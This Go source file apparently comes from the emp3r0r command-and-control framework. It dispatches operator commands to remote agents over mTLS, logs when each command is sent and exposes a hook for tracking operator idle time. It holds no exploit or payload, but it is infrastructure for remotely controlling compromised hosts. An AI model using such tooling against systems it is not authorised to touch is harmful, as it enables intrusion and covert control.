package controllers

import (
	"fmt"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/api/client"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/jobs"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

// OnCommandSent is invoked after a command has been successfully dispatched
// to an agent. The operator frontend uses this to track operator idle per
// agent (how long since the agent last received a command from the operator).
var OnCommandSent func(agentTag string)

// ExecuteCommand sends a command to an agent through the mTLS C2 operator server
// This replaces operator.operatorSendCommand2Agent
func ExecuteCommand(cmd, jobID, agentTag string) error {
	if jobID == "" {
		// create a job to track this command
		job := jobs.CreateJob(cmd, "command", agentTag)
		if job == nil {
			return fmt.Errorf("failed to create job for command: %s", cmd)
		}
		jobID = job.ID
	}
	operation := def.Operation{
		AgentTag: agentTag,
		Action:   "command",
		Command:  &cmd,
		JobID:    &jobID,
	}

	// Record command time immediately. Note: this must not update the agent's
	// LastSeen; LastSeen reflects only agent activity, while operator idle is
	// tracked separately via OnCommandSent.
	now := time.Now()
	live.CmdTime.Store(jobID, now.Format("2006-01-02 15:04:05.999999999 -0700 MST"))

	// Send command asynchronously to avoid blocking
	go func() {
		err := client.SendCommand(operation)
		if err != nil {
			logging.Errorf("Failed to send command to agent %s: %v", agentTag, err)
			return
		}
		if OnCommandSent != nil {
			OnCommandSent(agentTag)
		}
	}()

	return nil
}
